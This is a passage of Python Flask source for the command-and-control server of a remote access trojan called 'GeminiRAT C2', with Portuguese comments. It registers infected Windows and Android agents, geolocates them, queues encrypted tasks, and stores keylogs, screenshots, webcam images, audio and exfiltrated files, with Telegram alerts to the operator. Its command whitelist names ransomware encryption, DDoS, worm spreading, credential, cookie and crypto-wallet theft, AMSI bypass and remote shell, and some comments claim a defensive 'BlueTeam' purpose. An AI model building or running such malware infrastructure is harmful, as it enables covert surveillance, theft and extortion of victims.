            "sysinfo":         _parse(row["sysinfo"]),
            "sysinfo_at":      row["sysinfo_at"],
            "processes":       _parse(row["processes"]),
            "processes_at":    row["processes_at"],
            "network_recon":   _parse(row["network_recon"]),
            "network_recon_at":row["network_recon_at"],
        }), 200

    except Exception as e:
        logger.error("Falha ao buscar profile do agente %s: %s", agent_id, e)
        return jsonify({"error": "Erro interno."}), 500


@app.route('/api/agent/<agent_id>/screenshots', methods=['GET'])
@login_required
def get_agent_screenshots(agent_id):
    """Retorna lista de screenshots e webcam snaps completados para o agente."""
    try:
        limit = min(int(request.args.get('limit', 50)), 200)
        conn  = get_db_connection()
        rows  = conn.execute(
            """SELECT id, command, timestamp_issued, data_type, result
               FROM tasks
               WHERE agent_id = ?
                 AND status   = 'completed'
                 AND data_type IN ('screenshot_result', 'webcam_snap_result')
               ORDER BY timestamp_issued DESC
               LIMIT ?""",
            (agent_id, limit)
        ).fetchall()
        conn.close()

        items = []
        for row in rows:
            items.append({
                "task_id":   row["id"],
                "command":   row["command"],
                "timestamp": row["timestamp_issued"],
                "data_type": row["data_type"],
                "data":      row["result"],  # base64 string
            })
        return jsonify(items), 200
    except Exception as e:
        logger.error("Falha ao buscar screenshots do agente %s: %s", agent_id, e)
        return jsonify({"error": "Erro interno."}), 500


@app.route('/api/agent/<agent_id>/audio_captures', methods=['GET'])
@login_required
def get_agent_audio_captures(agent_id):
    """Retorna lista de capturas de audio completadas para o agente."""
    try:
        limit = min(int(request.args.get('limit', 50)), 200)
        conn  = get_db_connection()
        rows  = conn.execute(
            """SELECT id, command, timestamp_issued, result
               FROM tasks
               WHERE agent_id = ?
                 AND status   = 'completed'
                 AND data_type = 'audio_capture_result'
               ORDER BY timestamp_issued DESC
               LIMIT ?""",
            (agent_id, limit)
        ).fetchall()
        conn.close()

        items = []
        for row in rows:
            try:
                obj = json.loads(row['result']) if isinstance(row['result'], str) else row['result']
            except Exception:
                obj = {}
            items.append({
                "task_id":    row["id"],
                "timestamp":  row["timestamp_issued"],
                "duration_s": obj.get("duration_s", "?"),
                "samplerate": obj.get("samplerate", "?"),
                "size_kb":    obj.get("size_kb", "?"),
                "filename":   obj.get("filename", "audio_capture.wav"),
                "wav_b64":    obj.get("wav_b64", ""),
            })
        return jsonify(items), 200
    except Exception as e:
        logger.error("Falha ao buscar audio captures do agente %s: %s", agent_id, e)
        return jsonify({"error": "Erro interno."}), 500


@app.route('/register_mobile', methods=['POST'])
@mobile_auth_required
def register_mobile_agent():
    """
    Endpoint de registo simplificado para o agente Android, AGORA USANDO O BANCO DE DADOS.
    """
    try:
        data = request.json
        if not data:
            return jsonify({"error": "Payload JSON inválido ou vazio."}), 400

        agent_id = str(uuid.uuid4())
        
        # Usa o IP real da requisição
        external_ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr

        # Conecta ao banco de dados
        conn = get_db_connection()
        cursor = conn.cursor()

        # Prepara os dados para inserção no banco
        agent_data = {
            "id": agent_id,
            "hostname": data.get("hostname", "Dispositivo Android"),
            "username": data.get("username", "Utilizador Android"),
            "internal_ip": "N/A (Mobile)",
            "external_ip": external_ip,
            "os_name": data.get("os_name", "Android"),
            "privileges": "User",
            "agent_version": data.get("agent_version", "1.0-Android"),
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "status": "online",
            "geo_latitude": None,
            "geo_longitude": None,
            "geo_city": None,
            "geo_country": None,
            "geo_last_checked": None
        }
        
        # Tenta obter a geolocalização -- geo_last_checked é sempre gravado
        # (com ou sem dados) para evitar chamadas repetidas de API no TTL
        geo = resolve_geo(external_ip)
        agent_data["geo_last_checked"] = int(time.time())
        if geo:
            agent_data.update({
                "geo_latitude": geo.get("latitude"),
                "geo_longitude": geo.get("longitude"),
                "geo_city": geo.get("city"),
                "geo_country": geo.get("country"),
            })

        # Insere o novo agente no banco de dados
        cursor.execute("""
            INSERT INTO agents (id, username, hostname, internal_ip, external_ip, os_name, privileges, agent_version, first_seen, last_seen, status, geo_latitude, geo_longitude, geo_city, geo_country, geo_last_checked)
            VALUES (:id, :username, :hostname, :internal_ip, :external_ip, :os_name, :privileges, :agent_version, :first_seen, :last_seen, :status, :geo_latitude, :geo_longitude, :geo_city, :geo_country, :geo_last_checked)
        """, agent_data)
        
        conn.commit()
        conn.close()

        # Log e notificação (essas funções já usam o DB, então estão corretas)
        log_system_event(agent_id, "REGISTER", f"Novo agente Android registado. Versão: {agent_data['agent_version']}")
        socketio.emit('agent_list_update', get_agents_with_status())

        # Retorna o ID do agente para o app Android
        return jsonify({"agent_id": agent_id})

    except Exception as e:
        # Este print agora vai mostrar um erro muito mais útil se algo der errado
        logger.error("Falha no endpoint /register_mobile: %s", e)
        import traceback
        traceback.print_exc() # Imprime o traceback completo do erro
        return jsonify({"error": "Erro interno no servidor ao registar agente mobile."}), 500



# --- API PARA AGENTES (Não requerem login) ---
@app.route('/register', methods=['POST'])
@hmac_required

def register_agent():
    encrypted_data = request.data
    decrypted_json_str = decrypt_data(encrypted_data, C2_AES_KEY)

    if not decrypted_json_str:
        logger.error("Falha ao decriptografar payload de registro.")
        return jsonify({"error": "Falha na decriptografia"}), 400

    data = json.loads(decrypted_json_str)
    agent_id = str(uuid.uuid4())
    
    conn = get_db_connection()
    cursor = conn.cursor()

    # Prepara os dados com valores PADRÃO (None ou N/A)
    agent_data = {
        "id": agent_id,
        "username": data.get("username"),
        "hostname": data.get("hostname"),
        "internal_ip": data.get("internal_ip", "N/A"),
        "external_ip": data.get("external_ip", "N/A"),
        "os_name": data.get("os_name"),
        "privileges": data.get("privileges", "Desconhecido"),
        "agent_version": data.get("agent_version", "2.2"),
        "first_seen": datetime.now().isoformat(),
        "last_seen": datetime.now().isoformat(),
        "status": "online",
        # --- CORREÇÃO: Inicializa os campos geo com None ---
        "geo_latitude": None,
        "geo_longitude": None,
        "geo_city": None,
        "geo_country": None,
        "geo_last_checked": None
    }

    # Tenta obter a geolocalização -- geo_last_checked é sempre gravado
    # (com ou sem dados) para evitar chamadas repetidas de API no TTL
    geo = resolve_geo(agent_data["external_ip"])
    agent_data["geo_last_checked"] = int(time.time())
    if geo:
        agent_data["geo_latitude"] = geo.get("latitude")
        agent_data["geo_longitude"] = geo.get("longitude")
        agent_data["geo_city"] = geo.get("city")
        agent_data["geo_country"] = geo.get("country")

    # Agora, o comando INSERT sempre terá valores para todos os campos,
    # mesmo que sejam None, evitando o ProgrammingError.
    cursor.execute("""
        INSERT INTO agents (id, username, hostname, internal_ip, external_ip, os_name, privileges, agent_version, first_seen, last_seen, status, geo_latitude, geo_longitude, geo_city, geo_country, geo_last_checked)
        VALUES (:id, :username, :hostname, :internal_ip, :external_ip, :os_name, :privileges, :agent_version, :first_seen, :last_seen, :status, :geo_latitude, :geo_longitude, :geo_city, :geo_country, :geo_last_checked)
    """, agent_data)
    
    conn.commit()
    conn.close()

    log_system_event(agent_id, "REGISTER", f"Novo agente registrado (CRIPTOGRAFADO). Versão: {agent_data['agent_version']}")

    if _alert_enabled('connect'):
        hostname = agent_data.get('hostname') or agent_id[:8]
        send_telegram_alert(
            f"<b>GeminiRAT C2</b>\n"
            f"<b>Agente conectado</b>\n"
            f"Host: <code>{hostname}</code>\n"
            f"IP Externo: <code>{agent_data.get('external_ip', 'N/A')}</code>\n"
            f"OS: <code>{agent_data.get('os_name', 'N/A')}</code>"
        )

    socketio.emit('agent_list_update', get_agents_with_status())

    response_json = json.dumps({"agent_id": agent_id})
    encrypted_response = encrypt_data(response_json, C2_AES_KEY)
    return app.response_class(encrypted_response, mimetype='text/plain')



@app.route('/get_task/<agent_id>', methods=['GET'])
@hmac_required

def get_task(agent_id):
    # --- PARTE 1: ATUALIZAÇÃO DO AGENTE (JÁ MIGRAdo) ---
    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute("SELECT external_ip, geo_last_checked FROM agents WHERE id = ?", (agent_id,))
    agent_row = cursor.fetchone()

    if not agent_row:
        conn.close()
        err_json = json.dumps({"error": "Agente não registrado"})
        return app.response_class(encrypt_data(err_json, C2_AES_KEY), mimetype='text/plain'), 404

    cursor.execute(
        "UPDATE agents SET last_seen = ?, status = 'online' WHERE id = ?",
        (datetime.now().isoformat(), agent_id)
    )
    conn.commit()

    try:
        ext_ip = agent_row['external_ip']
        last_checked = agent_row['geo_last_checked'] or 0
        if ext_ip and not any(ext_ip.startswith(p) for p in ["192.168.", "10.", "172.", "127."]):
            if (time.time() - last_checked) > GEO_CACHE_TTL_SECONDS:
                new_geo = resolve_geo(ext_ip)
                # geo_last_checked é SEMPRE atualizado, com ou sem dados,
                # para não tentar de novo a cada checkin durante o TTL
                if new_geo:
                    cursor.execute("""
                        UPDATE agents
                        SET geo_latitude = ?, geo_longitude = ?, geo_city = ?, geo_country = ?, geo_last_checked = ?
                        WHERE id = ?
                    """, (
                        new_geo.get('latitude'), new_geo.get('longitude'), new_geo.get('city'),
                        new_geo.get('country'), int(time.time()), agent_id
                    ))
                else:
                    cursor.execute(
                        "UPDATE agents SET geo_last_checked = ? WHERE id = ?",
                        (int(time.time()), agent_id)
                    )
                conn.commit()
    except Exception as e:
        logger.warning("Falha ao atualizar geo no get_task para %s: %s", agent_id, e)

    # --- PARTE 2: BUSCA DE TAREFAS (NOVA MIGRAÇÃO) ---
    task_to_send = None
    try:
        # 1. Busca a primeira tarefa com status 'Pendente' para este agente
        cursor.execute(
            "SELECT id, command, args FROM tasks WHERE agent_id = ? AND status = 'pending' ORDER BY timestamp_issued ASC LIMIT 1",
            (agent_id,)
        )
        task_row = cursor.fetchone()

        if task_row:
            # 2. Se uma tarefa foi encontrada, marca como 'in_progress' com timestamp de inicio
            task_id = task_row['id']
            cursor.execute(
                "UPDATE tasks SET status = 'in_progress', timestamp_started = ? WHERE id = ?",
                (datetime.now().isoformat(), task_id)
            )
            conn.commit()
            # Notifica o painel imediatamente que a task saiu de pending para in_progress
            socketio.emit('task_status_update', {
                'task_id': task_id,
                'agent_id': agent_id,
                'status': 'in_progress'
            })
            
            # Prepara a tarefa para ser enviada ao agente
            args_val = task_row['args']
            try:
                # Tenta decodificar se for um JSON, senão usa como está
                args_parsed = json.loads(args_val) if args_val and (args_val.startswith('{') or args_val.startswith('[')) else args_val
            except (json.JSONDecodeError, TypeError):
                args_parsed = args_val

            task_to_send = {"task_id": task_id, "command": task_row['command'], "args": args_parsed}
        else:
            # 3. Se nenhuma tarefa foi encontrada, envia 'sleep'
            task_to_send = {"command": "sleep", "args": "5"}
    except Exception as e:
        logger.error("Falha ao buscar tarefa para o agente %s: %s", agent_id, e)
        task_to_send = {"command": "sleep", "args": "15"} # Sleep mais longo em caso de erro de DB
    finally:
        # Garante que a conexão seja fechada
        conn.close()

    # --- PARTE 3: NOTIFICAÇÃO E RESPOSTA (LÓGICA ANTIGA REMOVIDA) ---
    # A notificação para o painel agora é feita de forma mais limpa
    socketio.emit('agent_list_update', get_agents_with_status())
    
    # A parte de criptografia e envio permanece a mesma
    payload_json = json.dumps(task_to_send)
    encrypted_payload = encrypt_data(payload_json, C2_AES_KEY)
    return app.response_class(encrypted_payload, mimetype='text/plain')


@app.route('/task_result', methods=['POST'])
@hmac_required

def post_result():
    logger.debug("Rota /task_result atingida às %s", datetime.now())
    """
    Processa o resultado de uma tarefa enviada por um agente.
    Versão v3.1 - Robusta, com status padronizado e notificações síncronas.
    """
    try:
        # 1. Descriptografa o payload
        encrypted_data = request.data
        decrypted_json_str = decrypt_data(encrypted_data, C2_AES_KEY)
        if not decrypted_json_str:
            logger.error("Falha ao decriptografar payload de resultado.")
            return jsonify({"error": "Falha na decriptografia"}), 400
        data = json.loads(decrypted_json_str)


        logger.debug("Dados recebidos e decriptografados: %s", data)

        # 2. Extrai os dados
        agent_id = data.get('agent_id')
        task_id = data.get('task_id')
        data_type = data.get('data_type', 'generic_result')
        result_data = data.get('result')

        if not agent_id or not task_id:
            return jsonify({"error": "Payload de resultado incompleto."}), 400

            
        # 3. Atualiza a tarefa no banco de dados
        conn = get_db_connection()
        cursor = conn.cursor()

        # Eventos de streaming não correspondem necessariamente a uma task persistida.
        stream_data_types = {"WORM_LOG", "WORM_VULN", "EXPLOIT_LOG", "keylogger_data"}
        is_stream_event = data_type in stream_data_types
        task_row = cursor.execute(
            "SELECT agent_id, command FROM tasks WHERE id = ?", (task_id,)
        ).fetchone()

        if not is_stream_event:
            if not task_row:
                conn.close()
                logger.warning("Resultado rejeitado: task inexistente id=%s agente=%s", task_id, agent_id)
                return jsonify({"error": "Tarefa não encontrada."}), 404
            if not hmac.compare_digest(str(task_row['agent_id']), str(agent_id)):
                conn.close()
                logger.warning(
                    "Resultado rejeitado: task=%s pertence a outro agente (recebido=%s)",
                    task_id, agent_id
                )
                return jsonify({"error": "Agente não corresponde à tarefa."}), 403

        # State machine: completed = sucesso, failed = erro do agente
        new_status_db = 'completed' if data_type != 'error' else 'failed'
        result_str = json.dumps(result_data) if isinstance(result_data, (dict, list)) else str(result_data)
        now_iso = datetime.now().isoformat()

        if task_row:
            cursor.execute(
                "UPDATE tasks SET status = ?, result = ?, data_type = ?, updated_at = ? WHERE id = ?",
                (new_status_db, result_str, data_type, now_iso, task_id)
            )
            conn.commit()

        # Notifica o painel da mudança de status em tempo real
        if task_row:
            socketio.emit('task_status_update', {
                'task_id': task_id,
                'agent_id': agent_id,
                'status': new_status_db
            })

        if data_type in ["WORM_LOG", "WORM_VULN"]:
            socketio.emit('worm_activity_log', {
                'agent_id': agent_id,
                'log_level': data_type,
                'message': result_data
            })
            conn.close()
            resp_json = json.dumps({"status": "success"})
            return app.response_class(encrypt_data(resp_json, C2_AES_KEY), mimetype='text/plain')

        if data_type == "EXPLOIT_LOG":
            logger.info("[EXPLOIT_LOG] agente=%s msg=%s", agent_id, str(result_data)[:120])
            socketio.emit('exploit_activity_log', {
                'agent_id': agent_id,
                'message': result_data
            })
            conn.close()
            resp_json = json.dumps({"status": "success"})
            return app.response_class(encrypt_data(resp_json, C2_AES_KEY), mimetype='text/plain')

        # 4. Loga o evento de sistema
        command_name = task_row['command'] if task_row else "desconhecido"
        
        if command_name != 'sleep':
            event_label = 'TASK_COMPLETED' if new_status_db == 'completed' else 'TASK_FAILED'
            log_system_event(agent_id, event_label, f"Comando '{command_name}' finalizado com status '{new_status_db}'.")
        

        # 5. Processa tipos de dados especiais (salvar arquivos, etc.)
        if data_type == 'file_download':
            try:
                file_content = base64.b64decode(result_data['content_b64'])
                agent_dir = os.path.join(DOWNLOADS_DIR, agent_id); os.makedirs(agent_dir, exist_ok=True)
                file_path = os.path.join(agent_dir, result_data['filename'])
                with open(file_path, 'wb') as f: f.write(file_content)
                log_system_event(agent_id, "DOWNLOAD_SUCCESS", f"Arquivo '{result_data['filename']}' salvo.")
            except Exception as e:
                log_system_event(agent_id, "ERROR", f"Erro ao salvar arquivo baixado: {e}")

        elif data_type == 'keylogger_data':
            try:
                            # Garante que o diretório do agente exista
                agent_keylog_dir = os.path.join(KEYLOGS_DIR, agent_id)
                os.makedirs(agent_keylog_dir, exist_ok=True)
                
                # Define o caminho do arquivo de log
                log_file_path = os.path.join(agent_keylog_dir, 'keylog.txt')
                
                # Salva o log no arquivo, adicionando uma nova linha
                with open(log_file_path, 'a', encoding='utf-8') as f:
                    f.write(result_data)
                
                logger.info("Keylog do agente %s salvo em %s", agent_id, log_file_path)
            
                # A sua lógica de banco de dados e WebSocket permanece
                conn_kl = get_db_connection()
                conn_kl.execute(
                    "INSERT INTO keylogs (agent_id, log_data, timestamp) VALUES (?, ?, ?)",
                    (agent_id, result_data, datetime.now().isoformat())
                )
                conn_kl.commit()
                conn_kl.close()
                socketio.emit('new_keylog', {'agent_id': agent_id, 'log_data': result_data})
            except Exception as e:
                log_system_event(agent_id, "ERROR", f"Falha ao processar keylog: {e}")

        # 6a. Atualiza o perfil acumulado do host (snapshot mais recente de cada tipo)
        PROFILE_DATA_TYPES = {
            'sysinfo_result':      ('sysinfo',       'sysinfo_at'),
            'processes_result':    ('processes',     'processes_at'),
            'network_recon_result':('network_recon', 'network_recon_at'),
        }
        if data_type in PROFILE_DATA_TYPES and new_status_db == 'completed':
            col_data, col_at = PROFILE_DATA_TYPES[data_type]
            profile_str = json.dumps(result_data) if isinstance(result_data, (dict, list)) else str(result_data)
            try:
                cursor.execute(
                    f"""
                    INSERT INTO agent_profile (agent_id, {col_data}, {col_at})
                    VALUES (?, ?, ?)
                    ON CONFLICT(agent_id) DO UPDATE SET
                        {col_data} = excluded.{col_data},
                        {col_at}   = excluded.{col_at}
                    """,
                    (agent_id, profile_str, now_iso)
                )
                conn.commit()
                logger.info("Profile '%s' atualizado para agente %s", data_type, agent_id)
            except Exception as e:
                logger.warning("Falha ao atualizar agent_profile (%s): %s", agent_id, e)

        # 6b. Notifica o painel com os dados atualizados

        # Emite o evento para a "Janela de Resultados"
        socketio.emit('new_result', {"agent_id": agent_id, "task_id": task_id, "data_type": data_type, "data": result_data})

        # Entrega o resultado ao Telegram se a task foi originada pelo bot
        _tg_deliver_result(task_id, data_type, result_data, agent_id)
        
        # Busca a lista de tarefas ATUALIZADA e emite para a "Linha do Tempo"
        conn_read = get_db_connection()
        tasks_from_db = conn_read.execute("SELECT * FROM tasks WHERE agent_id = ? ORDER BY timestamp_issued DESC", (agent_id,)).fetchall()
        conn_read.close()
        all_agent_tasks = [dict(row) for row in tasks_from_db]
        socketio.emit('tasks_update', {'agent_id': agent_id, 'tasks': all_agent_tasks})
        
        

    
        # 7. Responde ao agente
        resp_json = json.dumps({"status": "success"})
        return app.response_class(encrypt_data(resp_json, C2_AES_KEY), mimetype='text/plain')

    except Exception as e:
        logger.critical("Falha na rota /task_result: %s", e)
        import traceback
        traceback.print_exc()
        return jsonify({"error": "Erro interno do servidor ao processar resultado."}), 500



@app.route('/issue_command', methods=['POST'])
@login_required
@role_required(['Administrator', 'Operator']) # Garante que Observers não possam nem tentar
def issue_command_route():
    try:
        data = request.json
        agent_id = data.get('agent_id')
        command = data.get('command')
        args = data.get('args', "")

        if not agent_id or not command:
            return jsonify({"error": "agent_id e command são obrigatórios"}), 400

        # --- WHITELIST DE COMANDOS PERMITIDOS ---
        # Apenas comandos reconhecidos pelo agente são aceitos.
        # Qualquer string arbitrária é rejeitada com 400 antes de chegar ao banco.
        # Mitiga MITRE ATT&CK T1059 - restringe execução a comandos explicitamente conhecidos.
        ALLOWED_COMMANDS = {
            # Tarefas em background (THREADED_TASKS no agent.py)
            'encrypt', 'decrypt_target', 'network_scan',
            'start_attack', 'run_exploit', 'start_worm_mode',
            'capture_audio',                                                            # T1123
            'lateral_psexec',                                                           # T1570
            'ad_info', 'password_managers',                                             # T1087 / T1555
            'credentials_firefox', 'credential_manager', 'ssh_keys', 'browser_history',
            'rdp_credentials', 'crypto_wallets', 'installed_software', 'network_shares',
            'recent_files', 'vpn_configs',
            # Tarefas síncronas (SYNC_TASKS no agent.py)
            'webcam_snap', 'ransom_note', 'keylogger_start', 'keylogger_stop',
            'download', 'screenshot', 'sysinfo', 'cookies', 'processes',
            'credentials', 'shell', 'persist', 'start_listener', 'kill',
            'elevate', 'remote_exec', 'spawn', 'upload', 'network_recon',
            'wifi_passwords', 'clipboard',
            'clipboard_monitor', 'clipboard_monitor_stop',                              # T1115
            'session_export',                                                           # T1539
            'token_impersonation', 'revert_token',                                      # T1134
            'amsi_patch',                                                               # T1562
            'set_beacon',                                                               # controle de beacon
            # Sem retorno (NO_RETURN_TASKS no agent.py)
            'cleanup', 'env_tokens',
            # Especiais
            'sleep', 'scan_exploit',
        }

        if command not in ALLOWED_COMMANDS:
            log_operator_action(
                session.get('username'),
                "REJECTED_COMMAND",
                {'rejected_command': command, 'target_agent': agent_id}
            )
            return jsonify({"error": f"Comando '{command}' não reconhecido ou não permitido."}), 400

        # --- FIM DA WHITELIST ---

        # --- INÍCIO DA LÓGICA DE PERMISSÃO POR COMANDO ---

        # Lista de comandos de alto risco, restritos apenas a Administradores.
        ADMIN_ONLY_COMMANDS = [
            'cleanup',              # Risco de perda de acesso permanente.
            'encrypt',              # Ação explicitamente destrutiva (ransomware).
            'decrypt_target',       # Ação de recuperação sensível.
            'start_attack',         # Lança ataque DDoS, muito "barulhento" e arriscado.
            'start_worm_mode',      # Risco de propagação descontrolada.
            'amsi_patch',           # Bypass de AV — alto risco de detecção (T1562).
            'token_impersonation',  # Escalada de privilégio via token theft (T1134).
        ]

        # Verifica se o comando está na lista de restrição E se o usuário NÃO é um Administrador.
        if command in ADMIN_ONLY_COMMANDS and session.get('role') != 'Administrator':
            # Loga a tentativa de acesso não autorizado para auditoria.
            log_operator_action(
                session.get('username'), 
                "DENIED_COMMAND", 
                {'denied_command': command, 'target_agent': agent_id}
            )
            return jsonify({"error": f"Acesso negado. O comando '{command}' requer privilégios de Administrador."}), 403

        # --- FIM DA LÓGICA DE PERMISSÃO POR COMANDO ---

        # O resto da função continua como antes...
        conn = get_db_connection()
        cursor = conn.cursor()

        # Verifica se o agente existe
        cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
        if not cursor.fetchone():
            conn.close()
            return jsonify({"error": "Agente não encontrado"}), 404

        # Loga a ação do operador (agora sabemos que ela é permitida)
        log_operator_action(session.get('username'), command, {'agent_id': agent_id, 'args': args})
        
        # Prepara e insere a tarefa no banco de dados
        task_data = {
            "id": str(uuid.uuid4()),
            "agent_id": agent_id,
            "command": command,
            "args": json.dumps(args) if isinstance(args, (dict, list)) else args,
            "status": "pending",
            "timestamp_issued": datetime.now().isoformat(),
            "result": None,
            "data_type": None,
            "issued_by": session.get('username')
        }

        cursor.execute(
            """
            INSERT INTO tasks (id, agent_id, command, args, status, timestamp_issued, result, data_type, issued_by)
            VALUES (:id, :agent_id, :command, :args, :status, :timestamp_issued, :result, :data_type, :issued_by)
            """,
            task_data
        )
        
        conn.commit()
        conn.close()

        trigger_dashboard_update()
        
        return jsonify({"status": "Comando enfileirado", "task_id": task_data["id"]})

    except Exception as e:
        logger.critical("Falha na rota /issue_command: %s", e)
        import traceback
        traceback.print_exc()
        return jsonify({"error": "Erro interno do servidor ao criar a tarefa."}), 500


@app.route('/api/task/<task_id>', methods=['DELETE'])
@login_required
@role_required(['Administrator', 'Operator'])
def cancel_task(task_id):
    """
    Cancela uma task com status 'pending' ou 'in_progress'.
    Tasks ja concluidas, falhadas ou canceladas nao podem ser alteradas.
    """
    conn = get_db_connection()
    try:
        row = conn.execute(
            "SELECT id, agent_id, command, status FROM tasks WHERE id = ?", (task_id,)
        ).fetchone()

        if not row:
            return jsonify({'error': 'Task nao encontrada.'}), 404

        if row['status'] not in ('pending', 'in_progress'):
            return jsonify({'error': f"Nao e possivel cancelar task com status '{row['status']}'."}), 409

        conn.execute(
            "UPDATE tasks SET status = 'cancelled', updated_at = ? WHERE id = ?",
            (datetime.now().isoformat(), task_id)
        )
        conn.commit()

        log_operator_action(
            session.get('username'), 'CANCEL_TASK',
            {'task_id': task_id, 'command': row['command'], 'agent_id': row['agent_id']}
        )

        # Notifica o painel em tempo real
        socketio.emit('task_status_update', {
            'task_id':  task_id,
            'agent_id': row['agent_id'],
            'status':   'cancelled',
            'command':  row['command'],
        })

        return jsonify({'status': 'ok', 'task_id': task_id, 'new_status': 'cancelled'})
    finally:
        conn.close()


@app.route('/api/bulk_command', methods=['POST'])
@login_required
@role_required(['Administrator', 'Operator'])
def bulk_command_route():
    """
    Emite o mesmo comando para multiplos agentes de uma vez.

    Corpo JSON esperado:
        {
            "agent_ids": ["<id1>", "<id2>", ...],
            "command": "<comando>",
            "args": "<args opcionais>"
        }

    Retorna lista com task_id criado para cada agente.
    Agentes inexistentes sao silenciosamente ignorados (apenas os existentes
    recebem a task), e o campo 'skipped' lista os IDs nao encontrados.

    Por que importa (BlueTeam): bulk_command e o vetor mais comum em ataques
    de movimento lateral em massa -- ter o log de quem emitiu (issued_by) e
    para quais alvos e critico para forense pos-incidente (MITRE ATT&CK T1021).
    """
    try:
        data = request.get_json(silent=True) or {}
        agent_ids = data.get('agent_ids')
        command   = data.get('command')
        args      = data.get('args', '')

        if not agent_ids or not isinstance(agent_ids, list) or not command:
            return jsonify({"error": "agent_ids (lista) e command sao obrigatorios"}), 400

        # Reutiliza a mesma whitelist do /issue_command
        ALLOWED_COMMANDS = {
            # Tarefas em background (THREADED_TASKS no agent.py)
            'encrypt', 'decrypt_target', 'network_scan',
            'start_attack', 'run_exploit', 'start_worm_mode',
            'capture_audio',                                                            # T1123
            'lateral_psexec',                                                           # T1570
            'ad_info', 'password_managers',                                             # T1087 / T1555
            'credentials_firefox', 'credential_manager', 'ssh_keys', 'browser_history',
            'rdp_credentials', 'crypto_wallets', 'installed_software', 'network_shares',
            'recent_files', 'vpn_configs',
            # Tarefas síncronas (SYNC_TASKS no agent.py)
            'webcam_snap', 'ransom_note', 'keylogger_start', 'keylogger_stop',
            'download', 'screenshot', 'sysinfo', 'cookies', 'processes',
            'credentials', 'shell', 'persist', 'start_listener', 'kill',
            'elevate', 'remote_exec', 'spawn', 'upload', 'network_recon',
            'wifi_passwords', 'clipboard',
            'clipboard_monitor', 'clipboard_monitor_stop',                              # T1115
            'session_export',                                                           # T1539
            'token_impersonation', 'revert_token',                                      # T1134
            'amsi_patch',                                                               # T1562
            'set_beacon',                                                               # controle de beacon
            # Sem retorno (NO_RETURN_TASKS no agent.py)
            'cleanup', 'env_tokens',
            # Especiais
            'sleep', 'scan_exploit',
        }
        ADMIN_ONLY_COMMANDS = [
            'cleanup', 'encrypt', 'decrypt_target', 'start_attack', 'start_worm_mode'
        ]

        if command not in ALLOWED_COMMANDS:
            return jsonify({"error": f"Comando '{command}' nao reconhecido ou nao permitido."}), 400

        if command in ADMIN_ONLY_COMMANDS and session.get('role') != 'Administrator':
            log_operator_action(
                session.get('username'),
                "DENIED_BULK_COMMAND",
                {'denied_command': command, 'target_agents': agent_ids}
            )
            return jsonify({"error": f"Acesso negado. O comando '{command}' requer privilegios de Administrador."}), 403

        # Sanitiza e deduplica a lista de IDs
        agent_ids = list(set(str(aid).strip() for aid in agent_ids if aid))
        if not agent_ids:
            return jsonify({"error": "Lista de agent_ids vazia apos sanitizacao."}), 400

        conn = get_db_connection()
        cursor = conn.cursor()

        # Verifica quais agentes existem de fato
        placeholders = ','.join('?' * len(agent_ids))
        cursor.execute(f"SELECT id FROM agents WHERE id IN ({placeholders})", agent_ids)
        existing_ids = {row['id'] for row in cursor.fetchall()}
        skipped = [aid for aid in agent_ids if aid not in existing_ids]

        now_iso      = datetime.now().isoformat()
        issued_by    = session.get('username')
        args_encoded = json.dumps(args) if isinstance(args, (dict, list)) else args
        created      = []

        for aid in existing_ids:
            task_id = str(uuid.uuid4())
            cursor.execute(
                """
                INSERT INTO tasks (id, agent_id, command, args, status, timestamp_issued, result, data_type, issued_by)
                VALUES (?, ?, ?, ?, 'pending', ?, NULL, NULL, ?)
                """,
                (task_id, aid, command, args_encoded, now_iso, issued_by)
            )
            created.append({"agent_id": aid, "task_id": task_id})

        conn.commit()
        conn.close()

        log_operator_action(
            issued_by,
            f"BULK_{command.upper()}",
            {'targets': list(existing_ids), 'skipped': skipped, 'args': args}
        )
        trigger_dashboard_update()

        logger.info(
            "[BULK-CMD] %s emitiu '%s' para %d agente(s) (ignorados: %d).",
            issued_by, command, len(created), len(skipped)
        )

        return jsonify({
            "status": "ok",
            "created": len(created),
            "tasks": created,
            "skipped": skipped
        })

    except Exception as e:
        logger.critical("[BULK-CMD] Erro: %s", e)
        import traceback
        traceback.print_exc()
        return jsonify({"error": "Erro interno ao processar bulk command."}), 500


@app.route('/api/results/search', methods=['GET'])
@login_required
def search_results():
    """
    Busca cross-agent em resultados de tasks concluidas.

    Parametros de query:
        q         (str, obrigatorio) -- texto a buscar (min 2 chars)
        data_type (str, opcional)    -- filtrar por tipo de resultado
        agent_id  (str, opcional)    -- restringir a um agente especifico
        limit     (int, opcional)    -- max resultados (padrao 50, max 200)

    Retorna lista de matches com preview do resultado (primeiros 300 chars).

    Por que importa (BlueTeam): busca global em resultados e essencial para
    correlacionar IOCs (ex: um hash, um IP, uma credencial) encontrados em
    agentes distintos -- equivalente a uma query cross-host num SIEM
    (MITRE ATT&CK T1078: Valid Accounts, T1003: Credential Dumping).
    """
    try:
        q         = (request.args.get('q') or '').strip()
        data_type = (request.args.get('data_type') or '').strip()
        agent_id  = (request.args.get('agent_id') or '').strip()
        limit     = min(int(request.args.get('limit', 50)), 200)

        if len(q) < 2:
            return jsonify({"error": "Parametro 'q' deve ter ao menos 2 caracteres."}), 400

        pattern = f"%{q}%"

        # Constroi query dinamicamente para filtros opcionais
        where_clauses = [
            "t.status = 'completed'",
            "(t.result LIKE ? OR t.command LIKE ? OR t.args LIKE ?)"
        ]
        params = [pattern, pattern, pattern]

        if data_type:
            where_clauses.append("t.data_type = ?")
            params.append(data_type)

        if agent_id:
            where_clauses.append("t.agent_id = ?")
            params.append(agent_id)

        params.append(limit)

        sql = f"""
            SELECT t.id, t.agent_id, t.command, t.args, t.data_type,
                   t.result, t.timestamp_issued, t.issued_by,
                   a.hostname, a.username, a.external_ip, a.status AS agent_status
            FROM tasks t
            LEFT JOIN agents a ON a.id = t.agent_id
            WHERE {' AND '.join(where_clauses)}
            ORDER BY t.timestamp_issued DESC
            LIMIT ?
        """

        conn = get_db_connection()
        rows = conn.execute(sql, params).fetchall()
        conn.close()

        results = []
        for row in rows:
            raw = row["result"] or ""
            # Preview: nao retorna base64 inteiro para imagens
            if row["data_type"] in ("screenshot_result", "webcam_snap_result"):
                preview = "[imagem base64]"
            else:
                preview = raw[:300] + ("..." if len(raw) > 300 else "")

            results.append({
                "task_id":      row["id"],
                "agent_id":     row["agent_id"],
